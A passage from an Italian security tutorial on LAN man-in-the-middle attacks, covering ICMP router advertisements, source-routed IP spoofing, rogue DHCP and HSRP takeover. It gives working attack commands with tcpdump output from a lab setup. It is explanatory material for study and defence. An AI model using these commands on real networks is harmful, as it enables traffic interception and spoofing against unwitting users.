| protocollo Φ in grado di compromettere la confidenzialitα e l'integritα  |
| dei dati potendo proporsi ad un host come default gateway.               |
| Al fine di modificare a proprio vantaggio la tabella di routing di un    |
| host remoto un utente malevolo potrebbe inviare un ICMP router           |
| advertisement il cui campo Router Address del messaggio contenga il      |
| proprio indirizzo IP e un livello di preferenza superiore alla route di  |
| default settata staticamente sulla macchina della vittima.               |
|                                                                          |
| Segue un esempio di attacco che sfrutta gli ICMP router advertisement    |
| per alterare la tabella di routing dell'host vittima, lo scenario si     |
| presenta simile a quello illustrato nel precedente paragrafo:            |
|                                                                          |
| Default Gateway -> IP 192.168.1.1       MAC rr:oo:uu:tt:ee:rr            |
| Attacker        -> IP 192.168.1.4       MAC aa:tt:tt:aa:cc:kk            |
| Victim          -> IP 192.168.1.35      MAC vv:ii:cc:tt:ii:mm            |
|                                                                          |
| Questa volta il sistema vittima runna Windows98 che si Φ rivelato        |
| vulnerabile a questo tipo di attacco, la tabella di routing di tale host | 
| si presenta in origine in questo modo:                                   |
|                                                                          |
| C:\>route print                                                          |
|                                                                          |
| Route attive:                                                            |
|                                                                          |
|   Indirizzo rete         Maschera  Indirizzo gateway    Interfac. Metric | 
|           0.0.0.0          0.0.0.0     192.168.1.1   192.168.1.35      1 | 
|         127.0.0.0        255.0.0.0       127.0.0.1      127.0.0.1      1 | 
|       192.168.1.0    255.255.255.0    192.168.1.35   192.168.1.35      1 | 
|      192.168.1.35  255.255.255.255       127.0.0.1      127.0.0.1      1 | 
|     192.168.1.255  255.255.255.255    192.168.1.35   192.168.1.35      1 | 
|         224.0.0.0        224.0.0.0    192.168.1.35   192.168.1.35      1 | 
|   255.255.255.255  255.255.255.255    192.168.1.35        0.0.0.0      1 | 
|                                                                          |
| La route che a noi interessa Φ quella che fa riferimento al default      |
| gateway (0.0.0.0), sarα proprio quella che cercheremo di scavalcare      |
| proponendo al sistema della vittima una route con una metrica pi∙        |
| vantaggiosa:                                                             |
|                                                                          |
| # ./irdp -i eth0 -D 192.168.1.35 -p 1000                                 |
|                                                                          |
| In questo modo l'attacker forgia un ICMP router advertisement con il     |
| quale si propone alla vittima (-D 192.168.1.35) come default gateway con | 
| una preferenza superiore (-p 1000) alla route giα presente nella routing | 
| table.                                                                   |
|                                                                          |
| # tcpdump -ne                                                            |
| tcpdump: listening on eth0                                               |
| 15:01:15.870881 aa:tt:tt:aa:cc:kk vv:ii:cc:tt:ii:mm 0800 50:             |
| 192.168.1.4 > 192.168.1.35: icmp: router advertisement lifetime 30:00 1: | 
| {192.168.1.4 1000}                                                       |
|                                                                          |
| 1 packets received by filter                                             |
| 0 packets dropped by kernel                                              |
|                                                                          |
| La route proposta dall'attacker, avendo una metrica migliore, va cos∞ a  |
| sostituire quella presente in origine dando vita ad una situazione di    |
| man in the middle estremamente insidiosa:                                |
|                                                                          |
| C:\>route print                                                          |
|                                                                          |
| Route attive:                                                            |
|                                                                          |
|   Indirizzo rete         Maschera  Indirizzo gateway    Interfac. Metric | 
|           0.0.0.0          0.0.0.0     192.168.1.4   192.168.1.35      0 | 
|           0.0.0.0          0.0.0.0     192.168.1.1   192.168.1.35      1 | 
|         127.0.0.0        255.0.0.0       127.0.0.1      127.0.0.1      1 | 
|       192.168.1.0    255.255.255.0    192.168.1.35   192.168.1.35      1 | 
|      192.168.1.35  255.255.255.255       127.0.0.1      127.0.0.1      1 | 
|     192.168.1.255  255.255.255.255    192.168.1.35   192.168.1.35      1 | 
|         224.0.0.0        224.0.0.0    192.168.1.35   192.168.1.35      1 | 
|   255.255.255.255  255.255.255.255    192.168.1.35        0.0.0.0      1 | 
|                                                                          |
|                                                                          |
| 2.3 Source Ruoting                                                       |
|                                                                          |
| Come abbiamo potuto vedere nella prima parte dell'articolo quando un     |
| pacchetto IP lascia l'interfaccia del nostro host per raggiungere una    |
| destinazione remota dovrα attraversare diversi hop prima di giungere al  |
| sistema finale, le decisioni riguardanti il miglior percorso da far      |
| intraprendere ad ogni pacchetto sono lasciate di norma ai router i quali | 
| fanno le proprie scelte sulla base delle informazioni contenute nelle    |
| proprie tabelle di routing.                                              |
| Il source routing altro non Φ che un'opzione del protocollo IP che       |
| fornisce la possibilitα all'applicazione di decidere la rotta dei propri | 
| pacchetti, a causa degli abusi e della dubbia utilitα di questa opzione  |
| la quasi totalitα dei router scartano qualsiasi pacchetto che contenga   |
| tale opzione scongiurando qualsiasi sorta di attacco.                    |
| Ad ogni modo ho scelto di trattare l'argomento giudicandolo ugualmente   |
| interessante e di discutere le principali problematiche derivanti da un  |
| suo uso scorretto.                                                       |
|                                                                          |
| Il primo problema derivante dall'implementazione del source routing Φ    |
| quello di fornire ad un utente malizioso i mezzi per condurre un attacco | 
| IP spoofing NON blind, ma prima di avventurarci nella trattazione di     |
| questo attacco Φ necessaria una breve descrizione di tale attacco nella  |
| sua forma canonica: blind spoofing.                                      |
|                                                                          |
| Quando si parla di IP spoofing normalmente si fa riferimento al blind    |
| spoofing ovvero un attacco che prevede la generazione da parte di un     |
| host malevolo di pacchetti IP il cui header Φ stato forgiato in modo non | 
| convenzionale e contiene all'interno del campo source address un         |
| indirizzo IP fasullo che non coincide con l'IP del sistema che lo ha     |
| generato.                                                                |
| Questa tecnica permette di inviare traffico verso un host spacciandosi   |
| per qualcun altro (l'IP sorgente contenuto nell'header dei pacchetti)    |
| con il solo inconveniente di perdere la bidirezionalitα della            |
| connessione, in quanto le risposte ai nostri pacchetti spoofati          |
| giungeranno all'host che abbiamo impersonificato e non al nostro host    |
| riducendo notevolmente le nostre possibilitα di chiudere un TCP          |
| handshake con un possibile target.                                       |
|                                                                          |
| Avvalendoci delle funzionalitα offerte dall'opzione source routing del   |
| protocollo IP abbiamo la possibilitα di fornire noi stessi (sorgente dei | 
| pacchetti) la rotta da noi desiderata aggirando cos∞ le limitazioni      |
| insite in un attacco blind spoofing.                                     |
| Un utente malizioso pu≥ in questo modo mandare pacchetti con IP spoofato | 
| e l'opzione loose(4) source routing abilitata facendo comparire il       |
| proprio host come hop obbligato per una data destinazione, l'host che    |
| riceverα tali pacchetti risponderα all'host legittimo (quello per il     |
| quale ci siamo spacciati) ma i pacchetti transiteranno ugualmente        |
| attraverso l'host da cui proviene l'attacco fornendoci la possibilitα di | 
| prendere visione delle risponde che sopraggiungono.                      |
|                                                                          |
| (4) loose source routing: esistono due forme leggermente differenti di   |
|     source routing, strict source routing permette di specificare        |
|     l'esatto percorso che il pacchetto dovrα seguire per giungere a      |
|     destinazione, loose source routing, invece, permette di porre dei    |
|     passaggi obbligati che i pacchetti devono attraversare prima di      |
|     giungere a destinazione.                                             |
|                                                                          |
| E' di fondamentale importanza specificare che il percorso source routed  |
| influenza sia il tragitto che separa l'host mittente dal destinatario    |
| che vice versa, se cos∞ non fosse il nostro attacco non avrebbe modo di  |
| esistere.                                                                |
|                                                                          |
|                                                                          |
| BLIND SPOOFING                                                           |
|                                                                          |
|    ________   (1) SYN src=spoof dst=victim      ________                 |
|   |        |---------------------------------->|        |                |
|   | ATTACK |  (3) ACK src=spoof dst=victim     | VICTIM |                |
|   |________|---------------------------------->|________|                |
|                          ack=????                   |                    |
|                                                     |                    |
|    ________                                         |                    |
|   |        |   (2) SYN/ACK src=victim dst=spoof     |                    |
|   | SPOOF  |<---------------------------------------|                    |
|   |________|               ISN=xyz                                       |
|                                                                          |
|                                                                          |
|                                                                          |
| SOURCE ROUTED SPOOFING                                                   |
|                                                                          |
|                                                                          |
|    ________  (1) SYN src=spoof dst=victim       ________                 |
|   |        |---------------------------------->|        |                |
|   | ATTACK | (2) SYN/ACK src=victim dst=attack | VICTIM |                |
|   |________|<----------------------------------|________|                |
|      |  |                 ISN=xyz                   ^                    |
|      |  |                                           |                    |
|      |  |                                           |                    |
|      |  |       (3) ACK src=spoof dst=victim        |                    |
|    D |  |-------------------------------------------|                    |
|    R |                   ack=xyz+1                                       |
|    O .                                                                   |
|    P . (2) SYN/ACK src=victim dst=spoof                                  |
|      .              ISN=xyz                                              |
|      .                                                                   |
|      .                                                                   |
|    __V_____                                                              |
|   |        |                                                             |
|   | SPOOF  |                                                             |
|   |________|                                                             |
|                                                                          |
|                                                                          |
|                                                                          |
| Questa volta l'attacker cercherα di stabilire una sessione con il        |
| sistema victim facendo sembrare che la connessione arrivi dal sistema    |
| che per semplicitα ho denominato spoofed:                                |
|                                                                          |
| Router          -> IP 192.168.1.3       MAC rr:oo:uu:tt:ee:rr            |
| Attacker        -> IP 192.168.1.4       MAC aa:tt:tt:aa:cc:kk            |
| Spoofed         -> IP 192.168.1.5       MAC aa:tt:tt:aa:cc:kk            |
| Victim          -> IP 192.168.1.6       MAC vv:ii:cc:tt:ii:mm            |
|                                                                          |
| Prima di tutto l'attacker deve preoccuparsi di abilitare l'IP forwarding | 
| e il source routing sul proprio host:                                    |
|                                                                          |
| # echo 1 > /proc/sys/net/ipv4/ip_forward                                 |
| # echo 1 > /proc/sys/net/ipv4/conf/all/accept_source_route               |
|                                                                          |
| Lo spoofing dei pacchetti IP Φ ottenuto settando un source NAT su tutto  |
| il traffico in uscita dal proprio host, l'IP sorgente verrα convertito   |
| in fase di postrouting in maniera del tutto trasparente all'applicazione | 
|                                                                          |
| # iptables -t nat -A POSTROUTING -s 192.168.1.4 -j SNAT                  |
|   --to-source 192.168.1.5                                                |
|                                                                          |
| Ora siamo pronti per lanciare il nostro attacco, useremo netcat per      |
| generare del traffico source routed:                                     |
|                                                                          |
| # nc -g 192.168.1.3 -g 192.168.1.4 -G 4 192.168.1.6 21                   |
|                                                                          |
| Segue l'output commentato di tcpdump che illustra nel dettaglio le varie | 
| fasi dell'handshake spoofato:                                            |
|                                                                          |
| # tcpdump -ne                                                            |
| tcpdump: listening on eth0                                               |
| ## il sistema attacker (192.168.1.4) manda un pacchetto SYN spoofato che | 
| ## sembra aver origine dal sistema spoofed (192.168.1.5)                 |
| ## La destinazione di tale pacchetto Φ un generico router (192.168.1.3)  |
| 17:26:27.011855 aa:tt:tt:aa:cc:kk rr:oo:uu:tt:ee:rr 0800 90:             |
| 192.168.1.5.1029 > 192.168.1.3.21: [|tcp] (DF)                           |
|                                                                          |
| ## il router riceve il pacchetto e dopo aver preso visione del campo     |
| ## opzioni del pacchetto IP provvede ad instradarlo al prossimo hop      |
| ## source routed che corrisponde proprio all'host dell'attacker          |
| 17:26:27.012179 rr:oo:uu:tt:ee:rr aa:tt:tt:aa:cc:kk 0800 90:             |
| 192.168.1.5.1029 > 192.168.1.4.21: [|tcp] (DF)                           |
|                                                                          |
| ## l'host dell'attacker consegna il pacchetto SYN alla vittima           |
| 17:26:27.012295 aa:tt:tt:aa:cc:kk vv:ii:cc:tt:ii:mm 0800 90:             |
| 192.168.1.5.1029 > 192.168.1.6.21: [|tcp] (DF)                           |
|                                                                          |
| ## la vittima ora cercherα di rispondere con un SYN/ACK all'host         |
| ## che stiamo impersonificando, credendolo la sorgente del SYN che Φ     |
| ## stato inviato in realtα da attacker. Il primo host ad essere          |
| ## attraversato dalla risposta Φ proprio quello di attacker che compare  |
| ## nella lista degli hop source routed                                   |
| 17:26:27.012673 vv:ii:cc:tt:ii:mm aa:tt:tt:aa:cc:kk 0800 86:             |
| 192.168.1.6.21 > 192.168.1.4.1029: S 882931410:882931410(0)              |
| ack 3025356380 win 5792 &lt;mss[|tcp]> (DF)                                 |
|                                                                          |
| ## l'attacco Φ RIUSCITO! Siamo in possesso delle risposte della vittima  |
| ## compreso l'ISN che ci permetterα di chiudere l'handshake anche nei    |
| ## confronti di host che facciano utilizzo di numeri sequenziali pseudo  |
| ## random.                                                               |
| ## l'attacker droppa il pacchetto in postrouting in modo da impedire che | 
| ## raggiunga l'host spoofed che genererebbe un RST vanificando ogni suo  |
| ## sforzo                                                                |
| 17:26:27.012794 aa:tt:tt:aa:cc:kk rr:oo:uu:tt:ee:rr 0800 86:             |
| 192.168.1.6.21 > 192.168.1.3.1029: S 882931410:882931410(0)              |
| ack 3025356380 win 5792 &lt;mss[|tcp]> (DF)                                 |
|                                                                          |
| 5 packets received by filter                                             |
| 0 packets dropped by kernel                                              |
|                                                                          |
| Lo stesso attacco sarebbe possibile al di fuori della rete locale se il  |
| sistema finale e i dispositivi che separano l'attacker dal sistema       |
| destinazione avessero il source routing abilitato.                       |
|                                                                          |
| Un discorso a parte merita la trattazione delle problematiche legate     |
| alla raggiungibilitα degli indirizzi locali riservati da parte di host   |
| esterni che facciano uso dell'opzione source routing.                    |
| In particolare, la IANA ha riservato i seguenti blocchi di indirizzi al  |
| fine di garantire uno spazio di indirizzamento assegnabile a qualsiasi   |
| host prenda parte ad una rete locale privata che voglia garantire        |
| l'accesso ad Internet ai propri utenti:                                  |
|                                                                          |
|      10.0.0.0        -   10.255.255.255                                  |
|      172.16.0.0      -   172.31.255.255                                  |
|      192.168.0.0     -   192.168.255.255                                 |
|                                                                          |
| Questa convenzione garantisce l'accesso verso l'esterno e                |
| l'impossibilitα di accessi alla rete interna al tempo stesso, tali       |
| indirizzi, infatti, non sono assegnati per un uso pubblico e risultano   |
| di conseguenza non instradabili.                                         |
| Tuttavia un router di confine per una rete privata che supporti il       |
| source routing si pu≥ prestare a degli abusi e garantire accessi non     |
| autorizzati agli utenti remoti.                                          |
| Un attacker pu≥ utilizzare l'opzione loose source routing ed indicare    |
| l'indirizzo dell'interfaccia pubblica del gateway della rete privata     |
| come unico hop obbligato, la destinazione del pacchetto corrisponderα ad | 
| un IP privato interno alla rete.                                         |
| In questo modo il pacchetto lascerα la macchina attack con destinazione  |
| router, sarα il router stesso, una volta ricevuto il pacchetto, ad       |
| esaminare il campo opzioni dell'header IP e a sostituire l'indirizzo     |
| destinazione con quello indicato dall'host sorgente.                     |
|                                                                          |
|                                                                          |
|                                                                  victim1 | 
|                                     (2) src=attack dst=victim1 /         |
|                                                               /          |
|                                                              /           |
|    ________                                 ________        /            |
|   |        |                           eth0|        |eth1  /             |
|   | ATTACK |------------------------------>| ROUTER |_____/_____ victim2 | 
|   |________|  (1) src=attack dst=router    |________|     \              |
|                        LSRR=victim1                        \             |
|                                                             \            |
|                                                              \           |
|                                                               \          |
|                                                                \ victim3 | 
|                                                                          |
|                                                                          |
| Vediamo come potrebbe svolgersi tale attacco simulando in locale un'     |
| ipotetica situazione in cui un router di confine per una rete privata si | 
| trovi nella condizione di supportare l'opzione source routing:           |
|                                                                          |
| Router          -> eth0 192.168.1.6     MAC rr:oo:uu:tt:ee:rr            |
|                    eth1 10.0.0.1                                         |
| Attacker        -> IP 192.168.1.4       MAC aa:tt:tt:aa:cc:kk            |
| Victim          -> IP 10.0.0.2          MAC vv:ii:cc:tt:ii:mm            |
|                                                                          |
|                                                                          |
| Specifichiamo nella lista degli host source routed l'indirizzo IP del    |
| router di confine per la rete privata mentre come destinazione finale un | 
| IP privato di cui sappiamo o possiamo ipotizzarne l'esistenza:           |
|                                                                          |
| # nc -g 192.168.1.6 -G 4 10.0.0.2 21                                     |
|                                                                          |
| # tcpdump -ne port 21                                                    |
| tcpdump: listening on eth0                                               |
| ## attacker manda un SYN che ha destinazione iniziale l'interfaccia      |
| ## pubblica del router                                                   |
| 11:53:46.915604 aa:tt:tt:aa:cc:kk rr:oo:uu:tt:ee:rr 0800 86:             |
| 192.168.1.4.1038 > 192.168.1.6.21: S 3270882735:3270882735(0) win 5840   |
| &lt;mss[|tcp]> (DF)                                                         |
|                                                                          |
| ## il router una volta ricevuto il pacchetto prende visione delle        |
| ## opzioni contenuto nell'intestazione del pacchetto IP e provvede a     |
| ## modificare la rotta del pacchetto verso l'host interno 10.0.0.2       |
| 11:53:46.915910 rr:oo:uu:tt:ee:rr vv:ii:cc:tt:ii:mm 0800 86:             |
| 192.168.1.4.1038 > 10.0.0.2.21: S 3270882735:3270882735(0) win 5840      |
| &lt;mss[|tcp]> (DF)                                                         |
|                                                                          |
| ## l'host interno risponde con un SYN/ACK a tale richiesta e la consegna | 
| ## provvisoriamente all'interfaccia interna del router che...            |
| 11:53:46.916041 vv:ii:cc:tt:ii:mm rr:oo:uu:tt:ee:rr 0800 82:             |
| 10.0.0.2.21 > 10.0.0.1.1038: S 3246963737:3246963737(0) ack 3270882736   |
| win 16060 &lt;mss 1460,sackOK,[|tcp]> (DF)                                  |
|                                                                          |
| ## ...provvede ad instradarla verso l'attacker                           |
| 11:53:46.916144 rr:oo:uu:tt:ee:rr aa:tt:tt:aa:cc:kk 0800 82:             |
| 10.0.0.2.21 > 192.168.1.4.1038: S 3246963737:3246963737(0)               |
| ack 3270882736 win 16060 &lt;mss 1460,sackOK,[|tcp]> (DF)                   |
|                                                                          |
| ## l'attacker si appresta ad inviare l'ACK che permetterα di concludere  |
| ## l'handshake e di poter iniziare la comunicazione vera e propria       |
| 11:53:46.916295 aa:tt:tt:aa:cc:kk rr:oo:uu:tt:ee:rr 0800 78:             |
| 192.168.1.4.1038 > 192.168.1.6.21: . ack 3246963738 win 5840             |
| &lt;nop,nop,[|tcp]> (DF)                                                    |
|                                                                          |
| ## il router recapita il pacchetto proveniente da attacker all'host che  |
| ## si trova nella rete interna, la stato della sessione passa in         |
| ## ESTABLISHED                                                           |
| 11:53:46.916563 rr:oo:uu:tt:ee:rr vv:ii:cc:tt:ii:mm 0800 78:             |
| 192.168.1.4.1038 > 10.0.0.2.21: . ack 1 win 5840 &lt;nop,nop,[|tcp]> (DF)   |
|                                                                          |
| 6 packets received by filter                                             |
| 0 packets dropped by kernel                                              |
|                                                                          |
|                                                                          |
| 2.4 DHCP Spoofing                                                        |
|                                                                          |
| Il protocollo DHCP (Dynamic Host Configuration Protocol) risulta utile   |
| per gestire l'assegnazione dinamica dei parametri di rete degli host che | 
| ne facciano richiesta, tuttavia questo sistema ha dei pro e dei contro.  |
| Se da una parte il protocollo DHCP contribuisce ad alleggerire il lavoro | 
| degli amministratori nella configurazione delle macchine che popolano la | 
| rete dall'altra mette a repentaglio la sicurezza degli host che si       |
| avvalgono di tale servizio.                                              |
| In particolare manca qualsiasi procedura di autenticazione che attesti   |
| l'identitα del server che ci risponde, non c'Φ alcun meccanismo che ci   |
| permetta di verificare la natura delle informazioni ricevute.            |
| La presenza di un server DHCP non autorizzato pu≥ compromettere la       |
| sicurezza degli host che si avvalgono di tale servizio per determinare   |
| parametri sensibili quali il default gateway o il dns server.            |
| Segue un breve elenco dei parametri di configurazione che possono essere | 
| veicolati in un messaggio DHCP, l'elenco Φ tratto dall'RFC 2131:         |
|                                                                          |
|                                                                          |
|    IP-layer_parameters,_per_host:_                                       |
|                                                                          |
|    Be a router                     on/off                 HRC 3.1        |
|    Non-local source routing        on/off                 HRC 3.3.5      |
|    Policy filters for                                                    |
|    non-local source routing        (list)                 HRC 3.3.5      |
|    Maximum reassembly size         integer                HRC 3.3.2      |
|    Default TTL                     integer                HRC 3.2.1.7    |
|    PMTU aging timeout              integer                MTU 6.6        |
|    MTU plateau table               (list)                 MTU 7          |
|    IP-layer_parameters,_per_interface:_                                  |
|    IP address                      (address)              HRC 3.3.1.6    |
|    Subnet mask                     (address mask)         HRC 3.3.1.6    |
|    MTU                             integer                HRC 3.3.3      |
|    All-subnets-MTU                 on/off                 HRC 3.3.3      |
|    Broadcast address flavor        0x00000000/0xffffffff  HRC 3.3.6      |
|    Perform mask discovery          on/off                 HRC 3.2.2.9    |
|    Be a mask supplier              on/off                 HRC 3.2.2.9    |
|    Perform router discovery        on/off                 RD 5.1         |
|    Router solicitation address     (address)              RD 5.1         |
|    Default routers, list of:                                             |
|            router address          (address)              HRC 3.3.1.6    |
|            preference level        integer                HRC 3.3.1.6    |
|    Static routes, list of:                                               |
|            destination             (host/subnet/net)      HRC 3.3.1.2    |
|            destination mask        (address mask)         HRC 3.3.1.2    |
|            type-of-service         integer                HRC 3.3.1.2    |
|            first-hop router        (address)              HRC 3.3.1.2    |
|            ignore redirects        on/off                 HRC 3.3.1.2    |
|            PMTU                    integer                MTU 6.6        |
|            perform PMTU discovery  on/off                 MTU 6.6        |
|                                                                          |
|    Link-layer_parameters,_per_interface:_                                |
|    Trailers                       on/off                 HRC 2.3.1       |
|    ARP cache timeout              integer                HRC 2.3.2.1     |
|    Ethernet encapsulation         (RFC 894/RFC 1042)     HRC 2.3.3       |
|                                                                          |
|    TCP_parameters,_per_host:_                                            |
|    TTL                            integer                HRC 4.2.2.19    |
|    Keep-alive interval            integer                HRC 4.2.3.6     |
|    Keep-alive data size           0/1                    HRC 4.2.3.6     |
|                                                                          |
|                                                                          |
| Nell'esempio che segue andremo ad alterare il valore relativo al default | 
| router di un host che utilizzi DHCP per ricavare tale parametro di       |
| configurazione.                                                          |
|                                                                          |
| Configuriamo un demone dhcpd sulla nostra macchina, il file di           |
| configurazione potrebbe essere simile al seguente:                       |
|                                                                          |
| # vi /etc/dhcpd.conf                                                     |
|                                                                          |
| # dhcpd.conf                                                             |
| #                                                                        |
| # Configuration file for ISC dhcpd (see 'man dhcpd.conf')                |
| #                                                                        |
|                                                                          |
| subnet 192.168.1.0 netmask 255.255.255.0 {                               |
|   range 192.168.1.30 192.168.1.250;                                      |
|   option routers 192.168.1.4;                                            |
| }                                                                        |
|                                                                          |
| L'opzione routers serve ad indicare il default router di cui dovranno    |
| servirsi gli host che interrogheranno il nostro demone dhcp, in questo   |
| caso l'IP del default router Φ stato settato pari a quello del nostro    |
| host. Non ci resta che avviare il demone e restare a guardare.           |
|                                                                          |
| # dhcpd                                                                  |
| Internet Software Consortium DHCP Server 2.0pl5                          |
| Copyright 1995, 1996, 1997, 1998, 1999 The Internet Software Consortium. | 
| All rights reserved.                                                     |
|                                                                          |
| Please contribute if you find this software useful.                      |
| For info, please visit http://www.isc.org/dhcp-contrib.html              |
|                                                                          |
| Listening on Socket/eth0/192.168.1.0                                     |
| Sending on   Socket/eth0/192.168.1.0                                     |
|                                                                          |
|                                                                          |
| In questo modo tutto il traffico diretto verso una postazione remota     |
| transiterα attraverso di noi, saremo cos∞ in grado di manipolare ogni    |
| singolo pacchetto e alterare qualsiasi flusso di dati ci attraversi.     |
|                                                                          |
|                                                                          |
| 2.5 HSRP e VRRP                                                          |
|                                                                          |
| Hot Standby Router Protocol (HSRP) rappresenta la soluzione proprietaria | 
| proposta da Cisco per gestire la ridondanza dei gateway all'interno di   |
| una rete locale. Tale protocollo permette di eliminare il single point   |
| of failure rappresentato dal dispositivo che permette l'interconnessione | 
| della rete privata all'Internet pubblica.                                |
|                                                                          |
| Usando HSRP un insieme di router possono interagire al fine di operare   |
| come un singolo router virtuale, in tale architettura un solo router     |
| alla volta svolge la mansione di instradatore per la rete privata        |
| (active router).                                                         |
| Un altro router del gruppo Φ eletto come standby router ovvero il router | 
| che sostituirα l'active router in caso di malfunzionamento.              |
| L'active router e lo standby router sono nominati tali durante un        |
| processo iniziale di elezione che prevede lo scambio di messaggi Hello   |
| al fine di determinare i dispositivi il cui valore di prioritα risulti   |
| essere il pi∙ elevato.                                                   |
| Una volta terminato il processo di elezione l'active e lo standby router | 
| continuano a inviare messaggi di Hello con regolaritα, la mancata        |
| ricezione di messaggi di Hello per un tempo superiore al valore Holdtime | 
| stabilito in precedenza sono da ricondursi al malfunzionamento del       |
| dispositivo che nel caso di un active router verrα sostituito dalla      |
| standby router evitando il protrarsi del problema.                       |
| Nel caso in cui il malfunzionamento sia riconducibile allo standby       |
| router o quest'ultimo sia stato eletto ad active router il processo di   |
| elezione provvederα a delegare il roulo di standby ad un altro           |
| dispositivo in base alla prioritα dimostrata.                            |
| Il protocollo HSRP si serve del protocollo UDP per veicolare le proprie  |
| informazioni e utilizza la porta 1985, la struttura del pacchetto si     |
| presenta nel modo seguente, lo schema Φ tratto dall'RFC 2281:            |
|                                                                          |
|                                                                          |
|    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1       |
|    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+     |
|    |   Version     |   Op Code     |     State     |   Hellotime   |     |
|    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+     |
|    |   Holdtime    |   Priority    |     Group     |   Reserved    |     |
|    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+     |
|    |                      Authentication  Data                     |     |
|    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+     |
|    |                      Authentication  Data                     |     |
|    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+     |
|    |                      Virtual IP Address                       |     |
|    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+     |
|                                                                          |
|                                                                          |
| Mi limiter≥ a descrivere i campi che ritengo pi∙ significativi:          |
|                                                                          |
| - Op Code: indica il tipo di messaggio veicolato dal pacchetto, questo   |
|   campo pu≥ assumere tre possibili valori:                               |
|                                                                          |
|   0 - Hello, viene inviato da tutti i router durante il processo di      |
|       elezione per permettere l'elezione dell'active e dello standby     |
|       router. Successivamente vengono inviati ad intervalli regolari     |
|       dall'active e dallo standby router come garanzia del loro corretto | 
|       funzionamento, la mancata emissione di Hello message da parte di   |
|       un dispositivo per un tempo prolungato comporterα la sua           |
|       sostituzione;                                                      |
|                                                                          |
|   1 - Coup, viene generato da un dispositivo per forzare la propria      |
|       elezione ad active router;                                         |
|                                                                          |
|   2 - Resign, viene generato dall'active router nel caso esso desideri   |
|       cedere il proprio roulo di router attivo ad un altro dispositivo.  |
|                                                                          |
| - State: indica lo stato in cui il dispositivo si trova (es Active,      |
|   Standby, etc);                                                         |
|                                                                          |
| - Hellotime: indica la frequenza con cui vengono emessi i messaggi di    |
|   Hello dal dispositivo, di default tale valore Φ posto pari a tre       |
|   secondi;                                                               |
|                                                                          |
| - Holdtime: indica il tempo di validitα di ogni messaggio di Hello       |
|   emesso dal dispositivo, tale campo deve assumere un valore grande      |
|   almeno tre volte quello imposto da Hellotime in modo tale da mitigare  |
|   effetti indesiderati dovuti ad un eventuale packet loss;               |
|                                                                          |
| - Priority: rappresenta il parametro su cui avviene l'elezione dell'     |
|   active e standby router, il dispositivo con il valore di prioritα      |
|   maggiore sarα eletto come active;                                      |
|                                                                          |
| - Virtual IP Address: rappresenta l'indirizzo IP unico utilizzato da     |
|   tutti i dispositivi che prendono parte al gruppo HSRP.                 |
|                                                                          |
| Ora che conosciamo le basi che regolano il funzionamento del protocollo  |
| HSRP possiamo passare ad analizzarne i punti deboli che possono essere   |
| sfruttati da un attaccante per realizzare una condizione di man in the   |
| middle.                                                                  |
|                                                                          |
| Mi limiter≥ ad analizzare i pacchetti generati dal tool hsrp in mancanza | 
| di un dispositivo della Cisco su cui effettuare i miei test :)           |
| Dall'RFC 2281 possiamo ricavare le informazioni di cui abbiamo bisogno:  |
|                                                                          |
|  "Preemption capability                                                  |
|                                                                          |
|          If a router has higher priority than the active router and      |
|          preemption is configured, it MAY take over as the active router | 
|          using a Coup message."                                          |
|                                                                          |
| Il tool hsrp, come avremo modo di vedere, segue tali indicazioni per     |
| realizzare un take over sul protocollo HSRP:                             |
|                                                                          |
| # ./hsrp -d 224.0.0.2 -v 192.168.1.1 -a cisco -g 1 -i eth0               |
|                                                                          |
| # tcpdump -nX                                                            |
| tcpdump: listening on eth0                                               |
| 09:34:57.381440 192.168.1.4.1985 > 224.0.0.2.1985:  udp 20               |
| 0x0000   4500 0030 176e 0000 8011 81a0 c0a8 0104        E..0.n.......... | 
| 0x0010   e000 0002 07c1 07c1 001c 0000 0001 1003        ................ | 
| 0x0020   ffff 0100 6369 7363 6f00 0000 c0a8 0101        ....cisco....... | 
| 09:34:57.382360 192.168.1.4.1985 > 224.0.0.2.1985:  udp 20               |
| 0x0000   4500 0030 176f 0000 8011 819f c0a8 0104        E..0.o.......... | 
| 0x0010   e000 0002 07c1 07c1 001c 0000 0000 1003        ................ | 
| 0x0020   ffff 0100 6369 7363 6f00 0000 c0a8 0101        ....cisco....... | 
|                                                                          |
| 2 packets received by filter                                             |
| 0 packets dropped by kernel                                              |
|                                                                          |
| Quelli che seguono sono i dati cos∞ come appaiono una volta eliminati    |
| gli header IP e UDP:                                                     |
|                                                                          |
| 0001 1003 ffff 0100 6369 7363 6f00 0000 c0a8 0101                        |
|                                                                          |
| Il primo byte rappresenta il campo Version del pacchetto che vale 00,    |
| segue il campo Op Code 01 che sta ad indicare un messaggio di tipo Coup  |
| che viene generato da un dispositivo per forzare la propria elezione ad  |
| active router.                                                           |
| Il campo State vale 10 hex che tradotto in decimale significa 16 e sta   |
| ad indicare lo stato Active, il byte successivo vale 03 e sta ad         |
| indicare un Hellotime di tre secondi.                                    |
| Il byte ff che segue si riferisce invece all'Holdtime che risulta        |
| impostato al valore massimo consentito dal protocollo, tale valore       |
| corrisponde ad un tempo di 255 secondi.                                  |
| Un valore cos∞ elevato di Holdtime contribuisce al mantenimento della    |
| nostra posizione di active router anche in presenza di un ritardo nella  |
| generazione dei messaggi Helo alla sola condizione che tale ritardo non  |
| si protragga oltre al limite di Holdtime.                                |
| Il campo Priority Φ impostato al valore massimo consentito (ff) al fine  |
| di permettere lo scavalcamento dell'attuale active router.               |
| I due byte che seguono valgono 01 e 00 e si riferiscono rispettivamente  |
| ai campi Group e Reserved che risulta al momento non utilizzato.         |
| Le due word (1 word = 4 byte) che seguono costituiscono il campo         |
| Authentication  Data che come da specifiche Φ impostato a:               |
|                                                                          |
| 6369 7363 6f00 0000                                                      |
|                                                                          |
